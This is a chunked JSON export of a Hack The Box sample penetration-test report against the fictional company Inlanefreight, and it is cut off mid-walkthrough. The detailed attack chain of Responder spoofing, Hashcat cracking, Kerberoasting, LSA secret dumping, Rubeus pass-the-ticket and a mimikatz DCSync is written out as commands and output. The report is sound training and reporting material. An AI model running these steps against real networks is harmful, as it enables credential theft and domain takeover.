[
  {
    "text": "\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n",
    "metadata": {
      "doc_id": "Astra - sample-pentest-report-astra-pentest",
      "chunk_id": 0
    }
  },
  {
    "text": "Report of Findings Inlanefreight Ltd. June 2, 2022 Version 1.0 Hack The Box Confidential\\nTable of Contents– FINDING SEVERITIES .................................................................................................................................................... 32 APPENDIX B – EXPLOITED HOSTS ...................................................................................................................................................... 33 APPENDIX C – COMPROMISED USERS ................................................................................................................................................ 34 APPENDIX D – CHANGES/HOST CLEANUP ........................................................................................................................................... 35 APPENDIX E – INLANEFREIGHT.LOCAL DOMAIN PASSWORD REVIEW ................................................................................................ 36 2\\nStatement of Confidentiality The contents of this document have been developed by Hack The Box. Hack The Box considers the contents of this document to be proprietary and business confidential information. This information is to be used only in the performance of its intended use. This document may not be released to another vendor, business partner or contractor without prior written consent from Hack The Box. Additionally, no portion of this document may be communicated, reproduced, copied or distributed without the prior consent of Hack The Box. The contents of this document do not constitute legal advice. Hack The Box’s offer of services that relate to compliance, litigation or other legal interests are not intended as legal counsel and should not be taken as such. The assessment detailed herein is against a fictional company for training and examination purposes, and the vulnerabilities in no way affect Hack The Box external or internal infrastructure. 3\\nEngagement Contacts Inlanefreight Contacts Primary Contact Title Primary Contact Email Rachel Williams Chief Executive Officer rachel@inlanefreight.local Secondary Contact Title Secondary Contact Email William Ley Chief Technical Officer wley@inlanefreight.local Assessor Contact Assessor Name Title Assessor Contact Email Hack The Box Academy Security Consultant someone@htbacademy.local 4\\nExecutive Summary Inlanefreight Ltd. (“Inlanefreight” herein) contracted Hack The Box Academy to perform a Network Penetration Test of Inlanefreight’s internally facing network to identify security weaknesses, determine the impact to Inlanefreight, document all findings in a clear and repeatable manner, and provide remediation recommendations. Approach Hack The Box Academy performed testing under a “black box” approach May 12, 2022, to May 31, 2022 without credentials or any advance knowledge of Inlanefreight’s internally facing environment with the goal of identifying unknown weaknesses. Testing was performed from a non-evasive standpoint with the goal of uncovering as many misconfigurations and vulnerabilities as possible. Testing was performed remotely via a host that was provisioned specifically for this assessment. Each weakness identified was documented and manually investigated to determine exploitation possibilities and escalation potential. Hack The Box Academy sought to demonstrate the full impact of every vulnerability, up to and including internal domain compromise. If Hack The Box Academy were able to gain a foothold in the internal network, Inlanefreight allowed for further testing including lateral movement and horizontal/vertical privilege escalation to demonstrate the impact of an internal network compromise.",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 0
    }
  },
  {
    "text": "demonstrate the full impact of every vulnerability, up to and including internal domain compromise. If Hack The Box Academy were able to gain a foothold in the internal network, Inlanefreight allowed for further testing including lateral movement and horizontal/vertical privilege escalation to demonstrate the impact of an internal network compromise. 5\\nScope The scope of this assessment was one internal network range and the INLANEFREIGHT.LOCAL Active Directory domain. In-Scope Assets Host/URL/IP Address Description 192.168.195.0/24 Inlanefreight internal network Table 1: Scope Details Assessment Overview and Recommendations During the internal penetration test against Inlanefreight, Hack The Box Academy identified seven (7) findings that threaten the confidentiality, integrity, and availability of Inlanefreight’s information systems. The findings were categorized by severity level, with five (5) of the findings being assigned a high-risk rating, one (1) medium-risk, and one (1) low risk. There was also one (1) informational finding related to enhancing security monitoring capabilities within the internal network. The tester found Inlanefreight’s patch and vulnerability management to be well-maintained. None of the findings in this report were related to missing operating system or third-party patches of known vulnerabilities in services and applications that could result in unauthorized access and system compromise. Each flaw discovered during testing was related to a misconfiguration or lack of hardening, with most falling under the categories of weak authentication and weak authorization. One finding involved a network communication protocol that can be “spoofed” to retrieve passwords for internal users that can be used to gain unauthorized access if an attacker can gain unauthorized access to the network without credentials. In most corporate environments, this protocol is unnecessary and can be disabled. It is enabled by default primarily for small and medium sized businesses that do not have the resources for a dedicated hostname resolution (the “phonebook” of your network) server. During the assessment, the presence of these resources was observed on the network, so Inlanefreight should begin formulating a test plan to disable the dangerous service. The next issue was a weak configuration involving service accounts that allows any authenticated user to steal a component of the authentication process that can often be guessed offline (via password “cracking”) to reveal the human-readable form of the account’s password. These types of service accounts typically have more privileges than a standard user, so obtaining one of their passwords in clear text could result in lateral movement or privilege escalation and eventually in complete internal network compromise. The tester also noticed that the same password was used for administrator access to all servers within the internal network. This means that if one server is compromised, an attacker can re-use this password to access any server that shares it for administrative access. Fortunately, both issues can be corrected without the need for third-party tools. Microsoft’s Active Directory contains settings that can be used to minimize the risk of these resources being abused for the benefit of malicious users. A webserver was also found to be running a web application that used weak and easily",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 1
    }
  },
  {
    "text": "issues can be corrected without the need for third-party tools. Microsoft’s Active Directory contains settings that can be used to minimize the risk of these resources being abused for the benefit of malicious users. A webserver was also found to be running a web application that used weak and easily guessable credentials to access an administrative console that can be leveraged to gain unauthorized access to the underlying server. This could be exploited by an attacker on the internal network without needing a valid user account. This attack is very well- documented, so it is an exceedingly likely target can be particularly damaging, even in the hands of an unskilled attacker. Ideally, direct external access to this service would be disabled, but if it cannot be, it should be reconfigured with exceptionally strong credentials that are rotated frequently. Inlanefreight may also want to consider maximizing the log data collected from this device to ensure that attacks against it can be detected and triaged quickly. 6\\nThe tester also found shared folders with excessive permissions, meaning that all users in the internal network can access a considerable amount of data. While sharing files internally between departments and users is important to day-to-day business operations, wide open permissions on file shares may result in unintentional disclosure of confidential information. Even if a file share does not contain any sensitive information today, someone may unwittingly put such data there thinking it is protected when it isn’t. This configuration should be changed to ensure that users can access only what is necessary to perform their day-to-day duties. Finally, the tester noticed that testing activities seemed to go mostly unnoticed, which may represent an opportunity to improve visibility into the internal network and indicates that a real-world attacker might remain undetected if internal access is achieved. Inlanefreight should create a remediation plan based on the Remediation Summary section of this report, addressing all high findings as soon as possible according to the needs of the business. Inlanefreight should also consider performing periodic vulnerability assessments if they are not already being performed. Once the issues identified in this report have been addressed, a more collaborative, in-depth Active Directory security assessment may help identify additional opportunities to harden the Active Directory environment, making it more difficult for attackers to move around the network and increasing the likelihood that Inlanefreight will be able to detect and respond to suspicious activity. 7\\nNetwork Penetration Test Assessment Summary Hack The Box Academy began all testing activities from the perspective of an unauthenticated user on the internal network. Inlanefreight provided the tester with network ranges but did not provide additional information such as operating system or configuration information. Summary of Findings During the course of testing, Hack The Box Academy uncovered a total of seven (7) findings that pose a material risk to Inlanefreight’s information systems. Hack The Box Academy also identified one informational finding that, if addressed, could further strengthen Inlanefreight’s overall security posture. Informational findings are observations for areas of improvement",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 2
    }
  },
  {
    "text": "course of testing, Hack The Box Academy uncovered a total of seven (7) findings that pose a material risk to Inlanefreight’s information systems. Hack The Box Academy also identified one informational finding that, if addressed, could further strengthen Inlanefreight’s overall security posture. Informational findings are observations for areas of improvement by the organization and do not represent security vulnerabilities on their own. The below table provides a summary of the findings by severity level. Finding Severity High Medium Low Total 5 1 1 7 Table 2: Severity Summary Below is a high-level overview of each finding identified during testing. These findings are covered in depth in the Technical Findings Details section of this report. Finding # Severity Level Finding Name 1. High LLMNR/NBT-NS Response Spoofing 2. High Weak Kerberos Authentication (“Kerberoasting”) 3. High Local Administrator Password Re-Use 4. High Weak Active Directory Passwords 5. High Tomcat Manager Weak/Default Credentials High 6. Medium Insecure File Shares 7. Low Directory Listing Enabled 8. Info Enhance Security Monitoring Capabilities Table 3: Finding List 8\\nInternal Network Compromise Walkthrough During the course of the assessment Hack The Box Academy was able gain a foothold and compromise the internal network, leading to full administrative control over the INLANEFREIGHT.LOCAL Active Directory domain. The steps below demonstrate the steps taken from initial access to compromise and does not include all vulnerabilities and misconfigurations discovered during the course of testing. Any issues not used as part of the path to compromise are listed as separate, standalone issues in the Technical Findings Details section, ranked by severity level. The intent of this attack chain is to demonstrate to Inlanefreight the impact of each vulnerability shown in this report and how they fit together to demonstrate the overall risk to the client environment and help to prioritize remediation efforts (i.e., patching two flaws quickly could break up the attack chain while the company works to remediate all issues reported). While other findings shown in this report could be leveraged to gain a similar level of access, this attack chain shows the initial path of least resistance taken by the tester to achieve domain compromise. Detailed Walkthrough Hack The Box Academy performed the following to fully compromise the INLANEFREIGHT.LOCAL domain. 1. The tester utilized the Responder tool to obtain an NTLMv2 password hash for a domain user, bsmith. 2. This password hash was successfully cracked offline using the Hashcat tool to reveal the user's clear text password which granted a foothold into the INLANEFREIGHT.LOCAL domain, but with no more privileges than a standard domain user. 3. The tester then ran the BloodHound.py, a Python version of the popular SharpHound collection tool to enumerate the domain and create visual representations of attack paths. Upon review, the tester found that multiple privileged users existed in the domain configured with Service Principal Names (SPNs), which can be leveraged to perform a Kerberoasting attack and retrieve TGS Kerberos tickets for the accounts which can be cracked offline using Hashcat if a weak password is set. From",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 3
    }
  },
  {
    "text": "Upon review, the tester found that multiple privileged users existed in the domain configured with Service Principal Names (SPNs), which can be leveraged to perform a Kerberoasting attack and retrieve TGS Kerberos tickets for the accounts which can be cracked offline using Hashcat if a weak password is set. From here, the tester used the GetUserSPNs.py tool to carry out a targeted Kerberoasting attack against the mssqlsvc account, having found that the mssqlsvc account had local administrator rights over the host SQL01.INLANEFREIGHT.LOCAL which was an interesting target in the domain. 4. The tester was able to successfully crack this account's password offline, revealing the clear text value. 5. The tester was able to authenticate to the host SQL01.INLANEFREIGHT.LOCAL and retrieve a clear text password from the host's registry by decrypting LSA secrets for an account (srvadmin) which was set up for autologon. 6. This srvadmin account had local administrator rights over all servers (aside from Domain Controllers) in the domain so the tester was able to log into the MS01.INLANEFREIGHT.LOCAL host and retrieve a Kerberos TGT ticket for a logged in user, pramirez, who was part of the Tier I Server Admins group which granted the account DCSync rights over the domain object. This attack can be utilized to retrieve the NTLM password hash for any user in the domain, resulting in domain compromise and persistence via a Golden Ticket. 7. The tester used the Rubeus tool to extract the Kerberos TGT ticket for the pramirez user and perform a Pass-the- Ticket attack to authenticate as this user. 8. Finally, the tester was able to perform a DCSync attack after successfully authenticating with this user account via the Mimikatz tool which ended in domain compromise. 9\\nDetailed reproduction steps for this attack chain are as follows: Upon connecting to the network, the tester started the Responder tool and was able to capture a password hash for the bsmith user by spoofing NBT-NS/LLMNR traffic on the local network segment. $ sudo responder -I eth0 -wrfv __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR & MDNS Responder 3.0.6.0 <SNIP> [+] Generic Options: Responder NIC [eth0] Responder IP [192.168.195.168] Challenge set [random] Don't Respond To Names ['ISATAP'] [+] Current Session Variables: Responder Machine Name [WIN-TWWXTGD94CV] Responder Domain Name [3BKZ.LOCAL] Responder DCE-RPC Port [47032] [+] Listening for events... <SNIP> [SMB] NTLMv2-SSP Client : 192.168.195.205 [SMB] NTLMv2-SSP Username : INLANEFREIGHT\\bsmith [SMB] NTLMv2-SSP Hash : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FA AA50000000002000800330042004B005A0001001E00570049004E002D0054005700570058005400470044003900340043005600040034 00570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D80106000400020000000800300030000000000000000100000000 2000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A0010000000000000000000000000000000000 00900280063006900660073002F003100390032002E003100360038002E003100390035002E0031003600380000000000000000000000 0000 <SNIP> Figure 1: Retrieving Password Hash with Responder The tester was able to \"crack\" this password hash offline using the Hashcat tool and retrieve the clear text password value, thus granting a foothold to enumerate the Active Directory domain. $ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb 2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a0 02e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00 430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f84 6a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073 002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED> Figure 2: Cracking Password Hash with Hashcat The tester proceeded",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 4
    }
  },
  {
    "text": "a foothold to enumerate the Active Directory domain. $ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb 2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a0 02e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00 430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f84 6a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073 002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED> Figure 2: Cracking Password Hash with Hashcat The tester proceeded to enumerate user accounts configured with Service Principal Names (SPNs) that may be subject to a Kerberoasting attack, a lateral movement/privilege escalation technique that targets SPNs which are unique identifiers that Kerberos uses to map a service instance to a service account. Any domain user can request a Kerberos ticket for any service account in the domain and the ticket is encrypted with the service account's NTLM password hash, which can potentially be \"cracked\" offline to reveal the account's clear text password value. 10\\n$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ------------------------------------------- --------- -------- -------------------------- --------- ---- ------ MSSQLSvc/SQL01.inlanefreight.local:1433 mssqlsvc 2022-05-13 16:52:07.280623 <never> MSSQLSvc/SQL02.inlanefreight.local:1433 sqlprod 2022-05-13 16:54:52.889815 <never> MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 sqldev 2022-05-13 16:54:57.905315 <never> MSSQLSvc/QA001.inlanefreight.local:1433 sqlqa 2022-05-13 16:55:03.421004 <never> backupjob/veam001.inlanefreight.local backupjob 2022-05-13 18:38:17.740269 <never> vmware/vc.inlanefreight.local vmwaresvc 2022-05-13 18:39:10.691799 <never> Figure 3: Listing SPN Accounts with GetUserSPNs.py The tester then ran the Python version of the popular BloodHound Active Directory enumeration tool to collect information such as users, groups, computers, ACLs, group membership, user and computer properties, user sessions, local admin access, and more. This data can then be imported into a GUI tool to create visual representations of relationships within the domain and map out \"attack paths\" that can be used to potentially move laterally or escalate privileges within a domain. $ sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All INFO: Found AD domain: inlanefreight.local INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 503 computers INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL INFO: Found 652 users <SNIP> Figure 4: Running BloodHound Tool The tester used this tool to check privileges for each of the SPN accounts enumerated earlier and noticed that only the mssqlsvc account had any privileges beyond a standard domain user. This account had local administrator access over the SQL01 host. SQL servers are often high value targets in a domain as they hold privileged credentials, sensitive data, or may even have a more privileged user logged in. Figure 5: Confirming Local Admin Rights The tester then performed a targeted Kerberoasting attack to retrieve the Kerberos TGS ticket for the mssqlsvc service account. 11\\n$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation --------------------------------------- -------- -------- -------------------------- --------- --------- - MSSQLSvc/SQL01.inlanefreight.local:1433 mssqlsvc 2022-05-13 16:52:07.280623 <never> $krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a39 88485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c 782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3 c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c4 4ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf6828 6ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a8971 85716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP> Figure 6: Kerberoasting with GetUserSPNs.py The tester was able to successfully \"crack\" this password offline to reveal its clear text value. $ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> $krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a<S NIP>:<REDACTED> Figure 7: Cracking TGS Ticket with Hashcat",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 5
    }
  },
  {
    "text": "16:52:07.280623 <never> $krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a39 88485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c 782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3 c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c4 4ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf6828 6ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a8971 85716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP> Figure 6: Kerberoasting with GetUserSPNs.py The tester was able to successfully \"crack\" this password offline to reveal its clear text value. $ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> $krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a<S NIP>:<REDACTED> Figure 7: Cracking TGS Ticket with Hashcat This password could be used to access the SQL01 host remotely and retrieve a set of clear text credentials from the registry for the srvadmin account. $ crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa SMB 192.168.195.220 445 SQL01 [*] Windows 10.0 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False) SMB 192.168.195.220 445 SQL01 [+] INLANEFREIGHT.LOCAL\\mssqlsvc:<REDACTED> SMB 192.168.195.220 445 SQL01 [+] Dumping LSA secrets SMB 192.168.195.220 445 SQL01 INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7bd0f186CCCCC450c5e8cb53228cc0 SMB 192.168.195.220 445 SQL01 INLANEFREIGHT.LOCAL/srvadmin:$DCC2$10240#srvadmin#ef393703f3fabCCCCCa547caffff5f <SNIP> SMB 192.168.195.220 445 SQL01 INLANEFREIGHT\\srvadmin:<REDACTED> <SNIP> SMB 192.168.195.220 445 SQL01 [+] Dumped 10 LSA secrets to /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.secrets and /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.cached Figure 8: Dumping Credentials from LSA Using these credentials, the tester logged into the SQL01 host over Remote Desktop (RDP) and noted that another user, pramirez, was currently logged in as well. C:\\> query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME pramirez rdp-tcp#1 2 Active 3 5/14/2022 8:21 AM >srvadmin rdp-tcp#2 3 Active . 5/14/2022 8:24 AM Figure 9: Checking Logged-in Users The tester checked the BloodHound tool and noticed that this user had the ability to perform the DCSync attack, which is a technique for stealing the Active Directory password database by leveraging a protocol used by domain controllers to replicate domain data. This attack can be used to retrieve NTLM password hashes for any user in the domain. 12\\nFigure 10: Confirming DCSync Privileges After connecting, the tester used the Rubeus tool to view all Kerberos tickets currently available on the system and noticed that tickets for the pramirez user were present. PS C:\\> .\\Rubeus.exe triage ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 Action: Triage Kerberos Tickets (All Users) [*] Current LUID : 0x256aef ------------------------------------------------------------------------------------------------------------ ------------ | LUID | UserName | Service | EndTime | ------------------------------------------------------------------------------------------------------------ ------------ | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL | 5/14/2022 6:24:19 PM | | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:24:19 PM | | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM | | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | ProtectedStorage/DC01.INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM | | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01.INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM | | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01 | 5/14/2022 6:21:35 PM | | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM | | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM | | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM Figure 11: Viewing Available Kerberos TIckets The tester then used this tool to retrieve the Kerberos TGT",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 6
    }
  },
  {
    "text": "INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM | | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM | | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM Figure 11: Viewing Available Kerberos TIckets The tester then used this tool to retrieve the Kerberos TGT ticket for this user which could then be used to perform a \"pass-the-ticket\" attack and use the stolen TGT ticket to access resources in the domain. 13\\nPS C:\\> .\\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 Action: Dump Kerberos Ticket Data (All Users) [*] Target service : krbtgt [*] Target LUID : 0x1a8b19 [*] Current LUID : 0x256aef UserName : pramirez Domain : INLANEFREIGHT LogonId : 0x1a8b19 UserSID : S-1-5-21-1666128402-2659679066-1433032234-1108 AuthenticationPackage : Negotiate LogonType : RemoteInteractive LogonTime : 5/14/2022 8:21:35 AM LogonServer : DC01 LogonServerDNSDomain : INLANEFREIGHT.LOCAL UserPrincipalName : pramirez@INLANEFREIGHT.LOCAL ServiceName : krbtgt/INLANEFREIGHT.LOCAL ServiceRealm : INLANEFREIGHT.LOCAL UserName : pramirez UserRealm : INLANEFREIGHT.LOCAL StartTime : 5/15/2022 3:51:35 AM EndTime : 5/15/2022 1:51:35 PM RenewTill : 5/21/2022 8:21:35 AM Flags : name_canonicalize, pre_authent, initial, renewable, forwardable KeyType : aes256_cts_hmac_sha1 Base64(key) : 3g/++VoJZ4ipbExARBCKK960cN+3juTKNHiQ8XpHL/k= Base64EncodedTicket : doIFZDCCBWCgAwIBBaEDAgEWooIEVDCCBFBhgg<SNIP> ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 [*] Action: Import Ticket [+] Ticket successfully imported! Figure 12: Dumping Kerberos Ticket Data The tester performed the pass-the-ticket attack and successfully authenticated as the pramirez user. PS C:\\htb> .\\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP> Figure 13: Performing Pass-the-Ticket Attack This was confirmed using the klist command to view cached Kerberos tickets in the current session. 14\\nPS C:\\htb> klist Current LogonId is 0:0x256d1d Cached Tickets: (1) #0> Client: pramirez @ INLANEFREIGHT.LOCAL Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize Start Time: 5/15/2022 3:51:35 (local) End Time: 5/15/2022 13:51:35 (local) Renew Time: 5/21/2022 8:21:35 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0x1 -> PRIMARY Kdc Called: Figure 14: Listing Kerberos Tickets in Session The tester then utilized this access to perform a DCSync attack and retrieve the NTLM password hash for the built-in Administrator account which led to Enterprise Admin level access over the domain. PS C:\\htb> .\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\administrator [DC] 'INLANEFREIGHT.LOCAL' will be the domain [DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server [DC] 'INLANEFREIGHT\\administrator' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9)",
    "metadata": {
      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 7
    }
  },
  {
